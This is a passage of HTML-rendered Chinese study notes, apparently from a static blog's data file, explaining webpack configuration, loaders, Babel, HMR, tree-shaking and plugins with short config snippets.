class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> path=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;path&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-attr\">entry</span>:<span class=\"hljs-string\">&#x27;./src/index&#x27;</span>,\t<span class=\"hljs-comment\">//定义当前项目的入口</span><br>    <span class=\"hljs-attr\">output</span>:&#123;<br>        <span class=\"hljs-attr\">filename</span>:<span class=\"hljs-string\">&#x27;[name].js&#x27;</span>,\t\t\t<span class=\"hljs-comment\">//定义打包后文件的名称；</span><br>        <span class=\"hljs-attr\">path</span>:path.<span class=\"hljs-title function_\">join</span>(_dirname,<span class=\"hljs-string\">&#x27;./dist&#x27;</span>)<br>    &#125;，<br>    <span class=\"hljs-attr\">module</span>:&#123;<br>    \t<span class=\"hljs-comment\">//css处理器</span><br>    \t<span class=\"hljs-attr\">rules</span>:[&#123;<br>            <span class=\"hljs-attr\">test</span>:<span class=\"hljs-regexp\">/\\.css$/</span>,\t\t\t\t<span class=\"hljs-comment\">//css文件名过滤条件，满足即处理</span><br>            <span class=\"hljs-attr\">use</span>:[\t\t\t\t\t\t<span class=\"hljs-comment\">//使用怎样的loader去处理</span><br>            <span class=\"hljs-string\">&quot;style-loader&quot;</span>,<br>            <span class=\"hljs-string\">&quot;css-loader&quot;</span><br>            ]<br>        &#125;]<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>引入</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> styles=<span class=\"hljs-title function_\">requrie</span>(<span class=\"hljs-string\">&quot;./index.css&quot;</span>);<br><br><span class=\"hljs-keyword\">import</span> styles <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./index.css&#x27;</span>;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"loader有什么用？\"><a href=\"#loader有什么用？\" class=\"headerlink\" title=\"loader有什么用？\"></a>loader有什么用？</h5><h5 id=\"与旧时代html中维护css相比，使用loader有什么优劣？\"><a href=\"#与旧时代html中维护css相比，使用loader有什么优劣？\" class=\"headerlink\" title=\"与旧时代html中维护css相比，使用loader有什么优劣？\"></a>与旧时代html中维护css相比，使用loader有什么优劣？</h5><h5 id=\"如何在webpack接入Less，Sass，Stylus等？\"><a href=\"#如何在webpack接入Less，Sass，Stylus等？\" class=\"headerlink\" title=\"如何在webpack接入Less，Sass，Stylus等？\"></a>如何在webpack接入Less，Sass，Stylus等？</h5><h3 id=\"4-接入Babel\"><a href=\"#4-接入Babel\" class=\"headerlink\" title=\"4.接入Babel\"></a>4.接入Babel</h3><blockquote>\n<p>将ES6代码转译为ES5，向下兼容；</p>\n</blockquote>\n<ul>\n<li>安装依赖</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm i -D @babel/core @babel/preset-env babel-loader<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>声明产物出口<code>output</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> path=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;path&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-attr\">entry</span>:<span class=\"hljs-string\">&#x27;./src/index&#x27;</span>,\t<span class=\"hljs-comment\">//定义当前项目的入口</span><br>    <span class=\"hljs-attr\">output</span>:&#123;<br>        <span class=\"hljs-attr\">filename</span>:<span class=\"hljs-string\">&#x27;[name].js&#x27;</span>,\t\t\t<span class=\"hljs-comment\">//定义打包后文件的名称；</span><br>        <span class=\"hljs-attr\">path</span>:path.<span class=\"hljs-title function_\">join</span>(_dirname,<span class=\"hljs-string\">&#x27;./dist&#x27;</span>)<br>    &#125;，<br>    <span class=\"hljs-attr\">module</span>:&#123;<br>    \t<span class=\"hljs-comment\">//css处理器</span><br>    \t<span class=\"hljs-attr\">rules</span>:[&#123;<br>           \t\t<span class=\"hljs-attr\">test</span>:<span class=\"hljs-regexp\">/\\/js$/</span>,<br>    \t\t\t<span class=\"hljs-attr\">user</span>:[<br>    \t\t\t\t\t<span class=\"hljs-attr\">loader</span>:<span class=\"hljs-string\">&#x27;babel-loader&#x27;</span>,<br>    \t\t\t\t\t<span class=\"hljs-attr\">options</span>:&#123;<br>    \t\t\t\t\t\t\t<span class=\"hljs-attr\">presets</span>:[<br>    \t\t\t\t\t\t\t[<span class=\"hljs-string\">&#x27;@babel/preset-env&#x27;</span>]<br>                                ]<br>                            &#125;<br>                     ]<br>            ]<br>        &#125;]<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>执行<code>npx webpack</code></li>\n</ul>\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>Babel具体由什么功能？</li>\n<li>Babel与Webpack分别解决了什么问题？为何两者能协作到一块儿？</li>\n</ul>\n<h3 id=\"5-生成HTML\"><a href=\"#5-生成HTML\" class=\"headerlink\" title=\"5.生成HTML\"></a>5.生成HTML</h3><blockquote>\n<p>自动生成HTML文件；</p>\n</blockquote>\n<ul>\n<li>安装依赖</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm i -D html-webpack-plugin<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>声明产物出口<code>output</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> path=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;path&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-attr\">entry</span>:<span class=\"hljs-string\">&#x27;./src/index&#x27;</span>,\t<span class=\"hljs-comment\">//定义当前项目的入口</span><br>    <span class=\"hljs-attr\">output</span>:&#123;<br>        <span class=\"hljs-attr\">filename</span>:<span class=\"hljs-string\">&#x27;[name].js&#x27;</span>,\t\t\t<span class=\"hljs-comment\">//定义打包后文件的名称；</span><br>        <span class=\"hljs-attr\">path</span>:path.<span class=\"hljs-title function_\">join</span>(_dirname,<span class=\"hljs-string\">&#x27;./dist&#x27;</span>)<br>    &#125;，<br>    <span class=\"hljs-attr\">plugins</span>:[<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">HtmlWebpackPlugin</span>()]<br>&#125;;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>执行<code>npx webpack</code></li>\n</ul>\n<h5 id=\"问题-1\"><a href=\"#问题-1\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>相比于手工维护HTML内容，这张方式有什么优缺点？</li>\n</ul>\n<h2 id=\"四、使用web-pack–工具类\"><a href=\"#四、使用web-pack–工具类\" class=\"headerlink\" title=\"四、使用web pack–工具类\"></a>四、使用web pack–工具类</h2><h3 id=\"1-HMR-Hot-Module-Replacement\"><a href=\"#1-HMR-Hot-Module-Replacement\" class=\"headerlink\" title=\"1. HMR Hot Module Replacement\"></a>1. HMR Hot Module Replacement</h3><blockquote>\n<p>模块热替换，写完的代码能立刻更新到页面；</p>\n</blockquote>\n<ul>\n<li><p>开启HMR</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-attr\">devServer</span>:&#123;<br>\t<span class=\"hljs-attr\">hot</span>:<span class=\"hljs-literal\">true</span>,<br>\t<span class=\"hljs-attr\">open</span>:<span class=\"hljs-literal\">true</span><br>&#125;,<br><span class=\"hljs-attr\">module</span>:&#123;<br>    <br>&#125;,<br><span class=\"hljs-attr\">watch</span>:<span class=\"hljs-literal\">true</span><br></code></pre></td></tr></table></figure></li>\n<li><p>启动Webpack</p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npx webpack serve<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-Tree-shaking\"><a href=\"#2-Tree-shaking\" class=\"headerlink\" title=\"2.Tree-shaking\"></a>2.Tree-shaking</h3><blockquote>\n<p>删除没有使用到的代码</p>\n</blockquote>\n<ul>\n<li>Dead Code：代码没有被用到，不可到达；代码的执行结果不会被用到；代码只读不写；</li>\n<li>Tree-shaking：模块导出了但是没被使用；</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-attr\">mode</span>:<span class=\"hljs-string\">&quot;production&quot;</span>,<br><span class=\"hljs-attr\">optimization</span>:&#123;<br><span class=\"hljs-attr\">usedExports</span>:<span class=\"hljs-literal\">true</span>,<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"五、其他工具\"><a href=\"#五、其他工具\" class=\"headerlink\" title=\"五、其他工具\"></a>五、其他工具</h2><ul>\n<li>缓存</li>\n<li>Sourcemap</li>\n<li>性能监控</li>\n<li>日志</li>\n<li>代码压缩</li>\n<li>分包</li>\n<li>…</li>\n</ul>\n<h2 id=\"六、理解Loader\"><a href=\"#六、理解Loader\" class=\"headerlink\" title=\"六、理解Loader\"></a>六、理解Loader</h2><h3 id=\"1-Webpack只认识JS\"><a href=\"#1-Webpack只认识JS\" class=\"headerlink\" title=\"1.Webpack只认识JS\"></a>1.Webpack只认识JS</h3><blockquote>\n<p>为了处理非标准JS资源，设计出资源翻译模块—Loader</p>\n<p>用于将资源翻译为标准JS</p>\n</blockquote>\n<h3 id=\"2-使用loader\"><a href=\"#2-使用loader\" class=\"headerlink\" title=\"2.使用loader\"></a>2.使用loader</h3><ul>\n<li>安装依赖</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm add -D css-loader style-loader less-loader<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>添加<code>module</code>处理css文件</li>\n</ul>\n<h3 id=\"3-认识loader：链式调用\"><a href=\"#3-认识loader：链式调用\" class=\"headerlink\" title=\"3.认识loader：链式调用\"></a>3.认识loader：链式调用</h3><ul>\n<li>less-loader：将less=&gt;css;</li>\n<li>css-loader：将css包装成类似module.exports=”${css}”的内容，包装后的内容符合JS语法；</li>\n<li>style-loader：将css模块包进require语句，并在运行时调用injectStyle等函数将内容注入到页面的style标签；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/d65b92e7cb18342c.jpg\"></p>\n<h3 id=\"4-loader特点\"><a href=\"#4-loader特点\" class=\"headerlink\" title=\"4.loader特点\"></a>4.loader特点</h3><ul>\n<li>链式执行；</li>\n<li>支持异步执行；</li>\n<li>分normal、patch两种模式；</li>\n</ul>\n<h3 id=\"5-常见loader\"><a href=\"#5-常见loader\" class=\"headerlink\" title=\"5.常见loader\"></a>5.常见loader</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/fe2e05bc32513a45.jpg\"></p>\n<h5 id=\"问题-2\"><a href=\"#问题-2\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>Loader是什么？要求的输出是什么？</li>\n<li>Loader的链式调用是什么意思？如何串联多个loader？</li>\n<li>Loader中如何处理异步场景？</li>\n</ul>\n<h2 id=\"七、理解插件\"><a href=\"#七、理解插件\" class=\"headerlink\" title=\"七、理解插件\"></a>七、理解插件</h2><blockquote>\n<p>很多知名工具，如vscode、chrome、vue等都涉及了所谓的“插件架构“为什么？</p>\n</blockquote>\n<ul>\n<li>心智成本高=&gt;可维护性低=&gt;生命力弱</li>\n<li>插件架构精髓：对拓展开发，对修改封闭；</li>\n<li>Webpack很多功能都是基于插件的概念实现；</li>\n</ul>\n<h3 id=\"1-使用插件\"><a href=\"#1-使用插件\" class=\"headerlink\" title=\"1.使用插件\"></a>1.使用插件</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//引入插件</span><br><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">DashboardPlugin</span>=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;webpack-dashboard/plugin&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-comment\">//添加插件实例</span><br>    <span class=\"hljs-attr\">plugins</span>:[<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DashboardPlugin</span>()];<br>&#125;;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-编写插件\"><a href=\"#2-编写插件\" class=\"headerlink\" title=\"2.编写插件\"></a>2.编写插件</h3><h5 id=\"钩子\"><a href=\"#钩子\" class=\"headerlink\" title=\"钩子\"></a>钩子</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">SomePlugin</span>&#123;<br>    <span class=\"hljs-title function_\">apply</span>(<span class=\"hljs-params\">complier</span>)&#123;<br>        complier.<span class=\"hljs-property\">hooks</span>.<span class=\"hljs-property\">thisCompilation</span>.<span class=\"hljs-title function_\">tap</span>(<span class=\"hljs-string\">&#x27;SomePlugin&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">compilation</span>)=&gt;</span>&#123;<br>            <br>        &#125;)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>时机：编译过程的特定节点，webpack会以钩子的形式通知插件此刻正在发生什么事；</li>\n<li>上下文：通过tapable提供的回调机制，以参数的方式传递上下文信息；</li>\n<li>交互：在上下文参数对象中附带了很多存在side effect 的交互接口，插件可以通过这些接口改变；</li>\n</ul>\n<h5 id=\"问题-3\"><a href=\"#问题-3\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>Loader与插件有什么区同点？</li>\n<li>钩子有什么作用？如何监听钩子函数？</li>\n</ul>\n<h2 id=\"八、学习方法\"><a href=\"#八、学习方法\" class=\"headerlink\" title=\"八、学习方法\"></a>八、学习方法</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/979e56c5c207eac0.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/452e2397f71ff64e.jpg\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Webpack知识体系\"><a href=\"#Webpack知识体系\" class=\"headerlink\" title=\"Webpack知识体系\"></a>Webpack知识体系</h1><ul>\n<li>理解前端工程话概念、工具、目标；</li>\n<li>团队需要有人熟悉webpack；</li>\n<li>高阶前端必经之路；</li>\n</ul>\n<h2 id=\"一、什么是webpack\"><a href=\"#一、什么是webpack\" class=\"headerlink\" title=\"一、什么是webpack?\"></a>一、什么是webpack?</h2><h3 id=\"1-前端项目构成\"><a href=\"#1-前端项目构成\" class=\"headerlink\" title=\"1.前端项目构成\"></a>1.前端项目构成</h3><ul>\n<li>多媒体文件</li>\n<li>CSS</li>\n<li>JS</li>\n<li>HTML</li>\n<li>VUE</li>\n</ul>\n<h5 id=\"手动管理\"><a href=\"#手动管理\" class=\"headerlink\" title=\"手动管理\"></a>手动管理</h5><ul>\n<li>比如引入50个js文件，操作过程繁琐；</li>\n<li>当代码文件之间有依赖时，得严格依赖顺序书写；</li>\n<li>开发与生产环境一致，很呐接入TS或JS新特性；</li>\n<li>比较难接入Less、Sass等工具；</li>\n<li>JS、图片、CSS资源管理模型不一致；</li>\n</ul>\n<h3 id=\"2-常见工程化工具\"><a href=\"#2-常见工程化工具\" class=\"headerlink\" title=\"2.常见工程化工具\"></a>2.常见工程化工具</h3><ul>\n<li>Webpack</li>\n<li>Vite</li>\n<li>RollupJS</li>\n</ul>\n<h3 id=\"3-Webpack\"><a href=\"#3-Webpack\" class=\"headerlink\" title=\"3. Webpack\"></a>3. Webpack</h3><h5 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h5><ul>\n<li>多份资源文件打包成Bundle；</li>\n<li>支持Babel、Eslint、TS、CoffeeScript、Less、Sass；</li>\n<li>支持模块化处理CSS、图片等资源文件；</li>\n<li>支持HMR+开发服务器；</li>\n<li>支持持续监听、持续构建；</li>\n<li>支持代码分离；</li>\n<li>支持Tree-shaking;</li>\n<li>支持Sourcemap；</li>\n</ul>\n<h2 id=\"二、Webpack\"><a href=\"#二、Webpack\" class=\"headerlink\" title=\"二、Webpack\"></a>二、Webpack</h2><h3 id=\"1-示例\"><a href=\"#1-示例\" class=\"headerlink\" title=\"1.示例\"></a>1.示例</h3><h5 id=\"Setp1-安装webpack\"><a href=\"#Setp1-安装webpack\" class=\"headerlink\" title=\"Setp1.安装webpack\"></a>Setp1.安装webpack</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><br>npm i -D webpack webpack-cli<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"Setp2-编辑配置文件-webpack-config-js\"><a href=\"#Setp2-编辑配置文件-webpack-config-js\" class=\"headerlink\" title=\"Setp2.编辑配置文件 webpack.config.js\"></a>Setp2.编辑配置文件 webpack.config.js</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> path=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;path&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-attr\">entry</span>:<span class=\"hljs-string\">&#x27;./src/index&#x27;</span>,\t<span class=\"hljs-comment\">//定义当前项目的入口</span><br>    <span class=\"hljs-attr\">mode</span>:<span class=\"hljs-string\">&quot;development&quot;</span>,<br>    <span class=\"hljs-attr\">devtool</span>:<span class=\"hljs-literal\">false</span>,<br>    <span class=\"hljs-attr\">output</span>:&#123;<br>        <span class=\"hljs-attr\">filename</span>:<span class=\"hljs-string\">&#x27;[name].js&#x27;</span>,\t\t\t<span class=\"hljs-comment\">//定义打包后文件的名称；</span><br>        <span class=\"hljs-attr\">path</span>:path.<span class=\"hljs-title function_\">join</span>(_dirname,<span class=\"hljs-string\">&#x27;./dist&#x27;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>Step3.执行编译命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npx webpack<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>打包到./dist/main.js</p>\n</blockquote>\n<h3 id=\"2-核心流程\"><a href=\"#2-核心流程\" class=\"headerlink\" title=\"2.核心流程\"></a>2.核心流程</h3><ul>\n<li>入口处理：从entry文件开始，启动编译流程；</li>\n<li>以来解析：从entry开始，根据‘require’ or ‘import’ 等语句找到依赖资源；</li>\n<li>资源解析：更具‘module’配置，调用资源转移器，将png、css等非标准js资源转译为js内容；（如何实现？？）</li>\n<li>资源合并打包：将转译后的资源内容合并打包为可直接在浏览器运行的js文件；</li>\n</ul>\n<h3 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3.总结\"></a>3.总结</h3><ul>\n<li>多文件资源合成一个，减少http请求；</li>\n<li>支持模块化开发；</li>\n<li>支持高级JS特性；</li>\n<li>支持TS，CofferScript；</li>\n<li>…</li>\n</ul>\n<h2 id=\"三、使用Webpack–流程类\"><a href=\"#三、使用Webpack–流程类\" class=\"headerlink\" title=\"三、使用Webpack–流程类\"></a>三、使用Webpack–流程类</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/3d52e90c95397aa0.jpg\"></p>\n<h3 id=\"1-配置文件\"><a href=\"#1-配置文件\" class=\"headerlink\" title=\"1.配置文件\"></a>1.配置文件</h3><p>Webpack的使用基本都围绕“配置”展开，而这些配置大致可以分为两类：</p>\n<ul>\n<li>流程类：作用于流程中的某个或多个环节，直接影响打包效果的配置项；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/175cc632cc5489e6.jpg\"></p>\n<ul>\n<li>工具类：主流程之外，提供更多工程化能力的配置项；</li>\n</ul>\n<h3 id=\"2-必须配置\"><a href=\"#2-必须配置\" class=\"headerlink\" title=\"2.必须配置\"></a>2.必须配置</h3><blockquote>\n<p>在一个项目配置里面，至少需要entry和output</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> path=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;path&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-attr\">entry</span>:<span class=\"hljs-string\">&#x27;./src/index&#x27;</span>,\t<span class=\"hljs-comment\">//定义当前项目的入口</span><br>    <span class=\"hljs-attr\">output</span>:&#123;<br>        <span class=\"hljs-attr\">filename</span>:<span class=\"hljs-string\">&#x27;[name].js&#x27;</span>,\t\t\t<span class=\"hljs-comment\">//定义打包后文件的名称；</span><br>        <span class=\"hljs-attr\">path</span>:path.<span class=\"hljs-title function_\">join</span>(_dirname,<span class=\"hljs-string\">&#x27;./dist&#x27;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-处理CSS\"><a href=\"#3-处理CSS\" class=\"headerlink\" title=\"3.处理CSS\"></a>3.处理CSS</h3><ul>\n<li>安装loader</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm add -D css-loader style-loader<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>添加module处理css文件</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> path=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;path&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-attr\">entry</span>:<span class=\"hljs-string\">&#x27;./src/index&#x27;</span>,\t<span class=\"hljs-comment\">//定义当前项目的入口</span><br>    <span class=\"hljs-attr\">output</span>:&#123;<br>        <span class=\"hljs-attr\">filename</span>:<span class=\"hljs-string\">&#x27;[name].js&#x27;</span>,\t\t\t<span class=\"hljs-comment\">//定义打包后文件的名称；</span><br>        <span class=\"hljs-attr\">path</span>:path.<span class=\"hljs-title function_\">join</span>(_dirname,<span class=\"hljs-string\">&#x27;./dist&#x27;</span>)<br>    &#125;，<br>    <span class=\"hljs-attr\">module</span>:&#123;<br>    \t<span class=\"hljs-comment\">//css处理器</span><br>    \t<span class=\"hljs-attr\">rules</span>:[&#123;<br>            <span class=\"hljs-attr\">test</span>:<span class=\"hljs-regexp\">/\\.css$/</span>,\t\t\t\t<span class=\"hljs-comment\">//css文件名过滤条件，满足即处理</span><br>            <span class=\"hljs-attr\">use</span>:[\t\t\t\t\t\t<span class=\"hljs-comment\">//使用怎样的loader去处理</span><br>            <span class=\"hljs-string\">&quot;style-loader&quot;</span>,<br>            <span class=\"hljs-string\">&quot;css-loader&quot;</span><br>            ]<br>        &#125;]<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>引入</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> styles=<span class=\"hljs-title function_\">requrie</span>(<span class=\"hljs-string\">&quot;./index.css&quot;</span>);<br><br><span class=\"hljs-keyword\">import</span> styles <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./index.css&#x27;</span>;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"loader有什么用？\"><a href=\"#loader有什么用？\" class=\"headerlink\" title=\"loader有什么用？\"></a>loader有什么用？</h5><h5 id=\"与旧时代html中维护css相比，使用loader有什么优劣？\"><a href=\"#与旧时代html中维护css相比，使用loader有什么优劣？\" class=\"headerlink\" title=\"与旧时代html中维护css相比，使用loader有什么优劣？\"></a>与旧时代html中维护css相比，使用loader有什么优劣？</h5><h5 id=\"如何在webpack接入Less，Sass，Stylus等？\"><a href=\"#如何在webpack接入Less，Sass，Stylus等？\" class=\"headerlink\" title=\"如何在webpack接入Less，Sass，Stylus等？\"></a>如何在webpack接入Less，Sass，Stylus等？</h5><h3 id=\"4-接入Babel\"><a href=\"#4-接入Babel\" class=\"headerlink\" title=\"4.接入Babel\"></a>4.接入Babel</h3><blockquote>\n<p>将ES6代码转译为ES5，向下兼容；</p>\n</blockquote>\n<ul>\n<li>安装依赖</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm i -D @babel/core @babel/preset-env babel-loader<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>声明产物出口<code>output</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 